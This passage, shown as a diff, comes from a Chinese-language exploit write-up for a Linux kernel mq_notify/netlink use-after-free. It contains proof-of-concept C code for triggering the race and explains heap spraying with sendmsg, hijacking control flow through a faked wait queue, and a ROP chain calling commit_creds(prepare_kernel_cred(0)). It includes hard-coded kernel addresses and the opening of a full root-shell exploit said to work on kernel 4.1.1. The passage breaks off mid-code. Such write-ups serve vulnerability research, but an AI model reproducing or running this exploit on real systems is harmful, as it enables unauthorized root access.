@@ -1,0 +1,215 @@
+        int optval = 1;
+        if(setsockopt(fd,SOL_NETLINK,NETLINK_NO_ENOBUFS,&optval,4)){
+            perror("setsockopt ");
+        }
+        else{
+            puts("[*] wake up thread 1");
+        }
+    }
+    void tiger(int fd){
+        pthread_t pid;
+        struct state s;
+        s.ok = 0;
+        s.fd = fd;
+        s.close_fd = dup(fd);
+        if(errno = pthread_create(&pid,NULL,thread2,&s)){
+            perror("pthread_create ");
+            exit(-1);
+        }  
+        while(!(s.ok));
+        puts("[*] mq_notify start");
+        struct sigevent sigv;
+        sigv.sigev_signo = s.close_fd;
+        sigv.sigev_notify = SIGEV_THREAD;
+        sigv.sigev_value.sival_ptr = "test";
+        _mq_notify((mqd_t)0x666,&sigv);
+        puts("ok");
+    }
+    int main(){
+        int fd = -1;
+        fd = add_rmem_alloc();
+        tiger(fd);
+        puts("ok");
+        return 0;
+    }
+根据前面分析的流程，可以得到这个poc：
+  * add_rmem_alloc 函数：通过sendmsg 增加 sk_rmem_alloc,使其 > sk_rcvbuf
+  * tiger 函数： 通过再次创建一个线程(thread2) ,thread2执行的时候，执行mq_notify，在thread2开头先使用sleep，保证 thread1进入wait状态，然后close thread1使用的fd，然后唤醒thread1.
+  * 函数退出，执行do_exit，crash
+这是函数在崩溃的时候的调用栈  
+调用链如下：`do_exit -> ___fput -> __fput -> sock_close -> sock_release ->
+netlink_release`
+netlink_release:
+    static int netlink_release(struct socket *sock)
+    {
+        struct sock *sk = sock->sk;
+        struct netlink_sock *nlk;
+        if (!sk)
+            return 0;
+        netlink_remove(sk);
+        sock_orphan(sk);
+        nlk = nlk_sk(sk);
+        ................. 省略 .............................
+    }
+可以看到，已经被释放的sock又被重新使用了。
+### 利用分析
+通过前面分析可以知道，释放掉sock对象以后，sock对象指针成为野指针，如果我们再次分配kmalloc-1024就有可能分配到该内存，控制sock对象内的关键指针，就会更改程序流，再次分配kmalloc-1024的方式为堆喷，这里采用sendmsg，执行sendmsg系统调用时，调用路径如下，如箭头所示  
+最终会调用sendmsg，这里将会回调sock->proto_ops->sendmsg,当family是AF_UNIX时，将会调用unix_dgram_sendmsg
+#### 利用sendmsg控制数据
+整个调用路径如下如上图所示，从sysc_sendmsg-> **sys _sendmsg- >_**sys_sendmsg
+基本不需要任何条件，因此直接分析___sys_sendmsg函数，代码太长不在这贴了。
+  * 首先建立一个`ctl[36]`的数组,大小为36，然后把该数组地址给一个指针`ctl_buf`
+  * flag != MSG_CMSG_COMPAT ==> 把参数msg，传递给内核空间的msg_sys (均为 struct msghdr)
+  * 判断 msg_controllen 不大于 INT_AMX ，并将 该值赋给 ctl_len
+  * flag != MSG_CMSG_COMAPT ，因此调用 sock_malloc 
+  * 进入sock_malloc 首先判断malloc 的size是否大于sysctl_optmem_max（：int sysctl_optmem_max __read_mostly = sizeof(unsigned long)*(2**UIO_MAXIOV+512）(: uio_maxiov = 1024)(: sk_omem_alloc 初始化为0) ,因为我们要malloc的对象大小为1024，因此满足，所以通过kmalloc申请一个 1024 的堆空间，并返回该指针
+  * 回到___sys_sendmsg ： 把申请的堆空间指针赋值给 ctl_buf,并将 msg_control 拷贝进去，并将msg_sys->msg_control 修改为 ctl_buf
+  * used_address 为null，因此执行 sock_sendmsg,这里会回调sock->unix_dgram_ops->unix_dgram_sendmsg
+  * 进入unix_dgram_sendmsg
+  * 直接调用scm_send()->__scm_send()
+  * 在介绍下面之前，有必要理解一下 "control infomation",控制消息通过msghdr的msg_control传递，msg_control指向控制第一条控制信息所在位置，一次可以传递多个控制信息，控制信息的总长度为msg_controllen,每一个控制信息都有一个cmshdr的头部，因为包含多个控制信息，所以，下一个控制信息的地址，就是通过`当前控制信息地址 + cmsg_len`确定的,通过判断`当前控制信息地址 + cmsg_len > msg_controllen`可以确定是否还有控制消息 
+        struct cmsghdr {
+      __kernel_size_t cmsg_len;   /* data byte count, including hdr */
+          int     cmsg_level; /* originating protocol */
+          int     cmsg_type;  /* protocol-specific type */
+    };
+  * ___scm_send : cmsg_level != SQL_COCKET , cmsg_type，=1 或 2 都可以，只要能return 0 ;就可以
+  * 进入sock_alloc_send_pskb函数：判断 sk_wmem_alloc0);
+这样再通过sendmsg，给定control信息就可以堆喷占位了，不过这里因为sendmsg被阻塞了，所以通过循环去执行sendmsg是不行的，还是需要依赖于多线程。  
+（其实kmalloc-1024在内核中需求量不大，而且在qemu中，只需要通过一次sendmsg，就可以申请到这个对象）
+    for(i=0;isk_destruct，调用链如下：
+    netlink_release->call_rcu->deferred_put_nlk_sk -> sock_put -> sk_free -> __sk_free -> sk_destruct -> __sk_destruct -> netlink_sock_destruct
+，但是，在执行到netlink_release的时候，会调用netlink_remove->rhashtable_remove_fast,在这里会发生崩溃，想要到达call_rcu，路径太复杂。
+结合adlab给出的文章，可以利用netlink_sock的(struct wait_queue_head_t) wait
+结构体，这个结构体直接嵌入到netlink_sock结构体中。
+因此可以在用户空间伪造wait_queue_t,让netlink_sock->wait.task_list.next指向它，因为环境关闭了smap，因此可以不用考虑这个问题
+这样我们就可以控制rip  
+为了执行用户空间指令，我们首先需要构造ropchain关掉smep。  
+通用方法就是通过`mov cr4, rdi ; pop rbp ; ret`诸如此类的gadgets  
+但是直接控制rip为这条gadgets地址肯定达不到目的，因为内核栈内容不受控，因此首先需要栈迁移，例如`xchg esp,eax ;
+ret`,这里使用eax是非常合适的，看下图  
+  * rdi是wait结构体的的地址，rdi+8 -> next 的地址 ， 把这个指针的值即我们在用户空间伪造的 wait_queue_t->next 的地址 , 这样相当于rdx保存的是用户空间 fake wait_queue_t.next的地址
+  * 然后，根据next的偏移，找到wait_queue_t的地址，并给 rax 
+  * 然后 call [rax+0x10]
+可以看出来，eax必定是一个有效的用户空间地址
+构造执行rop的时候遇到一个问题，如图  
+在执行`push
+rbp`的时候crash了，没找到原因，就不写函数了，直接用rop执行commit_creds(prepare_kernelk_cred(0))  
+通常用如下gadgets (stack 状态)
+    addr->pop rdi ; ret
+    0
+    addr->prepare_kernel_cred
+    addr->mov rdi, rax ; ret
+    addr->commit_creds
+或者利用上面的变形  
+但是在我执行的时候又遇到一个问题，因为rax不为空
+    Dump of assembler code for function prepare_kernel_cred:
+    (省略)
+       0xffffffff810a1a80 :    test   rax,rax
+    => 0xffffffff810a1a83 :    je     0xffffffff810a1b78 
+       0xffffffff810a1a89 :    test   r12,r12
+       0xffffffff810a1a8c :    mov    rbx,rax
+       0xffffffff810a1a8f :    je     0xffffffff810a1b40 
+       0xffffffff810a1a95 :    mov    rdi,r12
+       0xffffffff810a1a98 :    call   0xffffffff810a1a00 
+       0xffffffff810a1a9d :    mov    r12,rax
+       0xffffffff810a1aa0 :    mov    rdi,rbx
+       0xffffffff810a1aa3 :    mov    rsi,r12
+       0xffffffff810a1aa6 :    mov    ecx,0x14
+       0xffffffff810a1aab :    rep movs QWORD PTR es:[rdi],QWORD PTR ds:[rsi]
+       0xffffffff810a1aae :    mov    DWORD PTR [rbx],0x1
+       0xffffffff810a1ab4 :    mov    rax,QWORD PTR [rbx+0x78]
+       0xffffffff810a1ab8 :    inc    DWORD PTR ds:[rax]
+       0xffffffff810a1abb :    mov    rax,QWORD PTR [rbx+0x80]
+       0xffffffff810a1ac2 :    test   rax,rax
+       0xffffffff810a1ac5 :   je     0xffffffff810a1ace 
+       0xffffffff810a1ac7 :   inc    DWORD PTR ds:[rax+0xc0]
+       0xffffffff810a1ace :   mov    rax,QWORD PTR [rbx+0x88]
+       0xffffffff810a1ad5 :   inc    DWORD PTR ds:[rax]
+       0xffffffff810a1ad8 :   mov    edx,0xd0
+       0xffffffff810a1add :   mov    QWORD PTR [rbx+0x50],0x0
+       0xffffffff810a1ae5 :   mov    QWORD PTR [rbx+0x58],0x0
+       0xffffffff810a1aed :   mov    QWORD PTR [rbx+0x60],0x0
+       0xffffffff810a1af5 :   mov    QWORD PTR [rbx+0x68],0x0
+       0xffffffff810a1afd :   mov    rsi,r12
+       0xffffffff810a1b00 :   mov    BYTE PTR [rbx+0x48],0x1
+       0xffffffff810a1b04 :   mov    QWORD PTR [rbx+0x70],0x0
+       0xffffffff810a1b0c :   mov    rdi,rbx
+       0xffffffff810a1b0f :   call   0xffffffff813478d0 
+       0xffffffff810a1b14 :   test   eax,eax
+       0xffffffff810a1b16 :   js     0xffffffff810a1b58 
+       0xffffffff810a1b18 :   dec    DWORD PTR ds:[r12]
+       0xffffffff810a1b1d :   je     0xffffffff810a1b30 
+       0xffffffff810a1b1f :   mov    rax,rbx
+       0xffffffff810a1b22 :   pop    rbx
+       0xffffffff810a1b23 :   pop    r12
+       0xffffffff810a1b25 :   pop    rbp
+       0xffffffff810a1b26 :   ret    
+       0xffffffff810a1b27 :   nop    WORD PTR [rax+rax*1+0x0]
+       0xffffffff810a1b30 :   mov    rdi,r12
+       0xffffffff810a1b33 :   call   0xffffffff810a1540 
+       0xffffffff810a1b38 :   mov    rax,rbx
+       0xffffffff810a1b3b :   pop    rbx
+       0xffffffff810a1b3c :   pop    r12
+       0xffffffff810a1b3e :   pop    rbp
+       0xffffffff810a1b3f :   ret    
+    (省略)
+       0xffffffff810a1b78 :   xor    eax,eax
+       0xffffffff810a1b7a :   jmp    0xffffffff810a1b3b 
+    (省略)
+    End of assembler dump.
+因为rax的原因，没有正确执行prepare_kernel_creds，因此还需要加一条gadgets
+开始找的iret gadget并不能运行成功，不知道为啥，在im0963老哥的提示下，换了一条gadgets解决了
+exploit：这份exploit在linux kernel 4.1.1上面测试成功了，内核不同，可能需要改一些偏移
+    #gcc exploit.c -lpthread -static -o exploit
+    #define _GNU_SOURCE
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #define MAX_MSGSIZE 1024
+    #define SOL_NETLINK (270)
+    #define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
+    struct state
+    {
+        int ok;
+        int fd;
+        int close_fd;
+    }state;
+    struct u_wait_queue{
+        unsigned int flag;
+        long* pri;
+        long* func;
+        long* next;
+        long* prev;
+    };
+    #define KERNCALL __attribute__((regparm(3)))
+    void ( * commit_creds )(void *) KERNCALL ;
+    size_t* (* prepare_kernel_cred)(void *) KERNCALL ;
+    void getroot(){
+        commit_creds = 0xffffffff810a1720 ;
+        prepare_kernel_cred = 0xffffffff810a1a60;
+        size_t cred = prepare_kernel_cred(0);
+        commit_creds(cred);
+    }
+    void getshell(){
+        system("/bin/sh");
+    }
+    unsigned long user_cs, user_ss, user_eflags,user_sp ;
+    void save_stats() {
+        asm(
+            "movq %%cs, %0\n"
+            "movq %%ss, %1\n"
+            "movq %%rsp, %3\n"
+            "pushfq\n"
